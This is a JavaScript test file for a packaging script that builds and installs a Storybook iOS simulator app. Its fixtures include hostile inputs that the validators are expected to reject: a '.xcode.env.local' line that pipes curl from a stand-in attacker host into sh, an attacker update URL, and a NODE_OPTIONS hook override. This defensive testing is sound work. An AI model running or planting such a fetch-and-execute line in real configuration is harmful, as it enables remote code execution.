import assert from 'node:assert/strict'
import { chmodSync, copyFileSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join, resolve } from 'node:path'
import { spawnSync } from 'node:child_process'
import { createHash } from 'node:crypto'
import test from 'node:test'

const packageScript = new URL('../scripts/storybook-package.mjs', import.meta.url)

async function loadPackaging() {
  return import(packageScript)
}

function makeTemporaryTree() {
  const root = mkdtempSync(join(tmpdir(), 'rally-storybook-package-'))
  const app = join(root, 'RallyStorybook.app')
  mkdirSync(join(app, 'Contents'), { recursive: true })
  writeFileSync(join(app, 'main.jsbundle'), 'RALLY_STORYBOOK_SENTINEL')
  writeFileSync(join(app, 'RallyStorybook'), 'binary')
  chmodSync(join(app, 'RallyStorybook'), 0o755)
  return { root, app }
}

test('resolveNamedIosSimulator rejects an ambiguous, absent, or non-iOS named device', async () => {
  const { resolveNamedIosSimulator } = await loadPackaging()
  const payload = {
    devices: {
      'com.apple.CoreSimulator.SimRuntime.iOS-26-3': [
        { name: 'Rally Storybook', udid: 'ONE', isAvailable: true, deviceTypeIdentifier: 'com.apple.CoreSimulator.SimDeviceType.iPhone-12' },
        { name: 'Rally Storybook', udid: 'TWO', isAvailable: true, deviceTypeIdentifier: 'com.apple.CoreSimulator.SimDeviceType.iPhone-12' },
      ],
      'com.apple.CoreSimulator.SimRuntime.tvOS-26-0': [
        { name: 'TV Rally Storybook', udid: 'TV', isAvailable: true },
      ],
    },
  }

  assert.throws(() => resolveNamedIosSimulator({ payload, simulatorName: 'Rally Storybook' }), /exactly one available iOS simulator/)
  assert.throws(() => resolveNamedIosSimulator({ payload, simulatorName: 'Missing' }), /Create or rename one simulator/)
  assert.throws(() => resolveNamedIosSimulator({ payload: { devices: { 'com.apple.CoreSimulator.SimRuntime.tvOS-26-0': [{ name: 'Rally Storybook', udid: 'TV', isAvailable: true }] } }, simulatorName: 'Rally Storybook' }), /exactly one available iOS simulator/)
})

test('validateXcodeEnvironment accepts only the current node pin and rejects shell payloads or override files', async () => {
  const { validateXcodeEnvironment } = await loadPackaging()
  const root = mkdtempSync(join(tmpdir(), 'rally-storybook-xcode-env-'))
  const ios = join(root, 'ios')
  mkdirSync(ios)
  const nodeBinary = '/Users/example/.nvm/versions/node/v24.14.0/bin/node'
  try {
    writeFileSync(join(ios, '.xcode.env'), '# comment\nexport NODE_BINARY=$(command -v node)\n')
    writeFileSync(join(ios, '.xcode.env.local'), `export NODE_BINARY=${nodeBinary}\n`)
    assert.doesNotThrow(() => validateXcodeEnvironment({ iosDirectory: ios, nodeBinary }))

    writeFileSync(join(ios, '.xcode.env.local'), 'export NODE_BINARY=$(curl attacker.invalid | sh)\n')
    assert.throws(() => validateXcodeEnvironment({ iosDirectory: ios, nodeBinary }), /unsafe/i)

    writeFileSync(join(ios, '.xcode.env.local'), `export NODE_BINARY=${nodeBinary}\n`)
    writeFileSync(join(ios, '.xcode.env.updates'), 'export UPDATE_URL=https://attacker.invalid\n')
    assert.throws(() => validateXcodeEnvironment({ iosDirectory: ios, nodeBinary }), /override/i)
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('packaging environment removes hostile endpoint, proxy, node, websocket, and MCP overrides', async () => {
  const { buildPackagingEnvironment } = await loadPackaging()
  const environment = buildPackagingEnvironment({
    EXPO_PUBLIC_SUPABASE_URL: 'https://production.example.test',
    SUPABASE_SERVICE_ROLE_KEY: 'secret',
    SENTRY_DSN: 'secret',
    POSTHOG_API_KEY: 'secret',
    HTTPS_PROXY: 'https://proxy.example.test',
    NODE_OPTIONS: '--require hostile-hook',
    STORYBOOK_WS_HOST: 'attacker',
    MCP_PORT: '7007',
    KEEP_ME: 'safe',
  })

  assert.deepEqual(Object.fromEntries(Object.entries(environment).filter(([key]) => key.startsWith('STORYBOOK_') || key.startsWith('EXPO_') || key === 'NODE_ENV')), {
    NODE_ENV: 'production',
    STORYBOOK_ENABLED: 'true',
    STORYBOOK_SERVER: 'false',
    STORYBOOK_DISABLE_TELEMETRY: 'true',
    EXPO_NO_DOTENV: '1',
    EXPO_OFFLINE: '1',
    EXPO_NO_TELEMETRY: '1',
  })
  for (const key of ['EXPO_PUBLIC_SUPABASE_URL', 'SUPABASE_SERVICE_ROLE_KEY', 'SENTRY_DSN', 'POSTHOG_API_KEY', 'HTTPS_PROXY', 'NODE_OPTIONS', 'STORYBOOK_WS_HOST', 'MCP_PORT', 'KEEP_ME']) {
    assert.equal(Object.hasOwn(environment, key), false, `${key} must be scrubbed`)
  }
})

test('assertOutputRunDirectory confines a new disposable run below outputs/rally-storybook', async () => {
  const { assertOutputRunDirectory, prepareOutputRoot } = await loadPackaging()
  const root = mkdtempSync(join(tmpdir(), 'rally-storybook-output-'))
  try {
    const physicalRoot = realpathSync(root)
    const outputRoot = join(physicalRoot, 'outputs', 'rally-storybook')
    assert.equal(prepareOutputRoot({ outputRoot, trustedRoot: physicalRoot }), outputRoot)
    assert.equal(existsSync(outputRoot), true)
    assert.equal(assertOutputRunDirectory({ outputRoot, runId: 'release-001', trustedRoot: physicalRoot }), join(outputRoot, 'release-001'))
    mkdirSync(join(outputRoot, 'release-001'), { recursive: true })
    assert.throws(() => assertOutputRunDirectory({ outputRoot, runId: 'release-001', trustedRoot: physicalRoot }), /already exists/)
    assert.throws(() => assertOutputRunDirectory({ outputRoot, runId: '../escape', trustedRoot: physicalRoot }), /simple directory name/)
    const outside = join(physicalRoot, 'outside')
    mkdirSync(outside)
    symlinkSync(outside, join(physicalRoot, 'symlinked-output'))
    assert.throws(() => assertOutputRunDirectory({ outputRoot: join(physicalRoot, 'symlinked-output', 'rally-storybook'), runId: 'escape', trustedRoot: physicalRoot }), /symbolic link/)
    assert.throws(() => prepareOutputRoot({ outputRoot: join(physicalRoot, 'symlinked-output', 'new-parent'), trustedRoot: physicalRoot }), /symbolic link/)
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('assertExactPackageLayout rejects metadata forks and permits only one root folder with four direct items', async () => {
  const { assertExactPackageLayout } = await loadPackaging()
  const expected = ['Install Rally Storybook.command', 'RallyStorybook.app', 'checksums.txt', 'manifest.json']
  assert.doesNotThrow(() => assertExactPackageLayout({ rootEntries: ['Rally Storybook'], packageEntries: expected }))
  assert.throws(() => assertExactPackageLayout({ rootEntries: ['Rally Storybook', '__MACOSX'], packageEntries: expected }), /top-level/)
  assert.throws(() => assertExactPackageLayout({ rootEntries: ['Rally Storybook'], packageEntries: [...expected, '._manifest.json'] }), /AppleDouble/)
  assert.throws(() => assertExactPackageLayout({ rootEntries: ['Rally Storybook'], packageEntries: [...expected, 'notes.txt'] }), /direct package entries/)
})

test('parseGitStatus preserves leading porcelain status bytes and every untracked path', async () => {
  const { parseGitStatus } = await loadPackaging()
  assert.deepEqual(parseGitStatus(' M rally-storybook/index.js\0?? rally-storybook/distribution/Install Rally Storybook.command\0'), [
    { state: ' M', path: 'rally-storybook/index.js' },
    { state: '??', path: 'rally-storybook/distribution/Install Rally Storybook.command' },
  ])
})

test('validateArtifact rejects wrong identity, platform, architecture, unsafe bundle, and checksum mismatch', async () => {
  const { createAppTreeHash, validateArtifact } = await loadPackaging()
  const { root, app } = makeTemporaryTree()
  try {
    const metadata = {
      bundleIdentifier: 'com.rallyactiver.rally.storybook',
      platform: 'iPhoneSimulator',
      architectures: ['arm64'],
      version: '1.0.0',
      build: '2026090901',
      updatesEnabled: false,
      updatesUrl: null,
      minimumOsVersion: '15.1',
      dtPlatformName: 'iphonesimulator',
      dtSdkName: 'iphonesimulator26.2',
      buildVersion: { platform: 'iOS Simulator', minimumOsVersion: '15.1', sdkVersion: '26.2' },
    }
    const verified = validateArtifact({ appPath: app, metadata, expectedAppHash: createAppTreeHash(app) })
    assert.equal(verified.bundleHash.length, 64)

    assert.throws(() => validateArtifact({ appPath: app, metadata: { ...metadata, bundleIdentifier: 'wrong' } }), /bundle identifier/)
    assert.throws(() => validateArtifact({ appPath: app, metadata: { ...metadata, platform: 'MacOSX' } }), /platform/)
    assert.throws(() => validateArtifact({ appPath: app, metadata: { ...metadata, architectures: ['x86_64'] } }), /architecture/)
    assert.throws(() => validateArtifact({ appPath: app, metadata: { ...metadata, updatesEnabled: true } }), /updates/)
    assert.throws(() => validateArtifact({ appPath: app, metadata: { ...metadata, updatesUrl: 'https://updates.example.test' } }), /updates URL/)
    assert.throws(() => validateArtifact({ appPath: app, metadata: { ...metadata, minimumOsVersion: '16.0' } }), /minimum OS/)
    assert.throws(() => validateArtifact({ appPath: app, metadata: { ...metadata, dtPlatformName: 'iPhoneOS' } }), /DTPlatformName/)
    assert.throws(() => validateArtifact({ appPath: app, metadata: { ...metadata, dtSdkName: 'iphonesimulator26.3' } }), /DTSDKName/)
    assert.throws(() => validateArtifact({ appPath: app, metadata: { ...metadata, buildVersion: { ...metadata.buildVersion, sdkVersion: '26.3' } } }), /LC_BUILD_VERSION/)
    assert.throws(() => validateArtifact({ appPath: app, metadata: { ...metadata, buildVersion: { ...metadata.buildVersion, platform: 'iOS' } } }), /LC_BUILD_VERSION/)
    writeFileSync(join(app, 'main.jsbundle'), 'RALLY_STORYBOOK_SENTINEL https://ltrdptqotnioajnlesqy.supabase.co')
    assert.throws(() => validateArtifact({ appPath: app, metadata }), /forbidden/i)
    writeFileSync(join(app, 'main.jsbundle'), 'RALLY_STORYBOOK_SENTINEL https://xovofmkyzyqjxvmvogsw.supabase.co')
    assert.throws(() => validateArtifact({ appPath: app, metadata }), /forbidden/i)
    writeFileSync(join(app, 'main.jsbundle'), 'RALLY_STORYBOOK_SENTINEL')
    assert.throws(() => validateArtifact({ appPath: app, metadata, expectedAppHash: '0'.repeat(64) }), /checksum mismatch/)
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('parseBuildVersion requires the iOS Simulator LC_BUILD_VERSION fields', async () => {
  const { parseBuildVersion } = await loadPackaging()
  const output = `Load command 12\n      cmd LC_BUILD_VERSION\n  cmdsize 32\n platform 7\n    minos 15.1\n      sdk 26.2\n`
  assert.deepEqual(parseBuildVersion(output), { platform: 'iOS Simulator', minimumOsVersion: '15.1', sdkVersion: '26.2' })
  assert.throws(() => parseBuildVersion('cmd LC_BUILD_VERSION\nplatform 2\nminos 15.1\nsdk 26.2'), /iOS Simulator/)
  assert.throws(() => parseBuildVersion('cmd LC_BUILD_VERSION\nplatform 7\nminos 15.1\nsdk 26.3'), /SDK/)
})

test('assertSameSourceEvidence rejects source drift after the native build', async () => {
  const { assertSameSourceEvidence } = await loadPackaging()
  const before = { sourceCommit: 'abc', dirtyOwnedFiles: [{ path: 'rally-storybook/package.json', status: ' M', sha256: '1' }], inputs: { 'package-lock.json': '2' } }
  assert.doesNotThrow(() => assertSameSourceEvidence(before, structuredClone(before)))
  assert.throws(() => assertSameSourceEvidence(before, { ...before, sourceCommit: 'def' }), /source evidence changed/)
  assert.throws(() => assertSameSourceEvidence(before, { ...before, inputs: { 'package-lock.json': '3' } }), /source evidence changed/)
  assert.throws(() => assertSameSourceEvidence(before, { ...before, dirtyOwnedFiles: [] }), /source evidence changed/)
})

test('packaging accepts no external app override and records current-worktree provenance', async () => {
  const { createManifest, parseCli } = await loadPackaging()
  const packagingContext = { sourceCommit: 'abc', dirtyOwnedFiles: [], inputs: {} }
  assert.equal(createManifest({ packagingContext, simulator: {}, nativeArtifact: {}, packageInfo: {} }).artifactSourceBinding, 'current-worktree')
  assert.throws(() => parseCli(['--simulator', 'Rally Storybook', '--run-id', 'release-1', '--app', '/tmp/stale.app']), /usage/)
})

test('installer boots only a shutdown named simulator and passes a package path with spaces as one simctl argument', async () => {
  const { createAppTreeHash } = await loadPackaging()
  const root = mkdtempSync(join(tmpdir(), 'rally-storybook-installer-'))
  const packageDirectory = join(root, 'Rally Storybook Package')
  const fakeBin = join(root, 'fake bin')
  const log = join(root, 'simctl.log')
  const { app } = makeTemporaryTree()
  try {
    mkdirSync(packageDirectory)
    mkdirSync(fakeBin)
    const installerPath = resolve(dirname(new URL(import.meta.url).pathname), '../distribution/Install Rally Storybook.command')
    const testInstaller = readFileSync(installerPath, 'utf8')
      .replaceAll('/usr/bin/xcrun', 'xcrun')
      .replaceAll('/usr/bin/lipo', 'lipo')
      .replaceAll('/usr/bin/open', 'open')
    writeFileSync(join(packageDirectory, 'Install Rally Storybook.command'), testInstaller)
    copyFileSync(join(app, 'main.jsbundle'), join(packageDirectory, 'main.jsbundle.placeholder'))
    rmSync(app, { recursive: true, force: true })
    mkdirSync(join(packageDirectory, 'RallyStorybook.app'))
    writeFileSync(join(packageDirectory, 'RallyStorybook.app', 'main.jsbundle'), 'RALLY_STORYBOOK_SENTINEL')
    writeFileSync(join(packageDirectory, 'RallyStorybook.app', 'RallyStorybook'), 'binary')
    writeFileSync(join(packageDirectory, 'RallyStorybook.app', 'Info.plist'), `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0"><dict><key>CFBundleIdentifier</key><string>com.rallyactiver.rally.storybook</string><key>CFBundleSupportedPlatforms</key><array><string>iPhoneSimulator</string></array></dict></plist>\n`)
    chmodSync(join(packageDirectory, 'RallyStorybook.app', 'RallyStorybook'), 0o755)
    const packagedApp = join(packageDirectory, 'RallyStorybook.app')
    const installerCopy = join(packageDirectory, 'Install Rally Storybook.command')
    chmodSync(installerCopy, 0o755)
    writeFileSync(join(packageDirectory, 'checksums.txt'), `${createAppTreeHash(packagedApp)}\tRallyStorybook.app\n${createHash('sha256').update(readFileSync(installerCopy)).digest('hex')}\tInstall Rally Storybook.command\n`)
    writeFileSync(join(fakeBin, 'xcrun'), `#!/bin/zsh\nprint -r -- \"$1|$2|$3|$#|$4\" >> ${JSON.stringify(log)}\nif [[ \"$1 $2 $3 $4\" == \"simctl list devices available\" ]]; then\n  if [[ \"$EXTRA_TV\" == 1 ]]; then print -- '== Devices ==' && print -- '-- tvOS 26.2 --' && print \"    Rally Storybook (AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA) ($SIM_STATE)\"; fi\n  print -- '-- iOS 26.3 --'\n  print \"    Rally Storybook (E6F1C950-9463-4D8A-8A86-A673702F7DCC) ($SIM_STATE)\"\nfi\n`)
    writeFileSync(join(fakeBin, 'lipo'), '#!/bin/zsh\nprint arm64\n')
    writeFileSync(join(fakeBin, 'open'), `#!/bin/zsh\nprint -r -- \"open|$1|$2\" >> ${JSON.stringify(log)}\n`)
    chmodSync(join(fakeBin, 'xcrun'), 0o755)
    chmodSync(join(fakeBin, 'lipo'), 0o755)
    chmodSync(join(fakeBin, 'open'), 0o755)
    const run = spawnSync('/bin/zsh', [installerCopy], {
      env: { ...process.env, PATH: `${fakeBin}:${process.env.PATH}`, SIM_STATE: 'Shutdown', EXTRA_TV: '1' },
      encoding: 'utf8',
    })
    assert.equal(run.status, 0, run.stderr)
    assert.deepEqual(readFileSync(log, 'utf8').trim().split('\n'), [
      'simctl|list|devices|4|available',
      'simctl|boot|E6F1C950-9463-4D8A-8A86-A673702F7DCC|3|',
      'simctl|bootstatus|E6F1C950-9463-4D8A-8A86-A673702F7DCC|3|',
      'open|-a|Simulator',
      `simctl|install|E6F1C950-9463-4D8A-8A86-A673702F7DCC|4|${realpathSync(packagedApp)}`,
      'simctl|launch|E6F1C950-9463-4D8A-8A86-A673702F7DCC|4|com.rallyactiver.rally.storybook',
    ])
    writeFileSync(log, '')
    const booted = spawnSync('/bin/zsh', [installerCopy], {
      env: { ...process.env, PATH: `${fakeBin}:${process.env.PATH}`, SIM_STATE: 'Booted' },
      encoding: 'utf8',
    })
    assert.equal(booted.status, 0, booted.stderr)
    assert.deepEqual(readFileSync(log, 'utf8').trim().split('\n'), [
      'simctl|list|devices|4|available',
      'simctl|bootstatus|E6F1C950-9463-4D8A-8A86-A673702F7DCC|3|',
      'open|-a|Simulator',
      `simctl|install|E6F1C950-9463-4D8A-8A86-A673702F7DCC|4|${realpathSync(packagedApp)}`,
      'simctl|launch|E6F1C950-9463-4D8A-8A86-A673702F7DCC|4|com.rallyactiver.rally.storybook',
    ])
  } finally {
    rmSync(root, { recursive: true, force: true })
    rmSync(app, { recursive: true, force: true })
  }
})
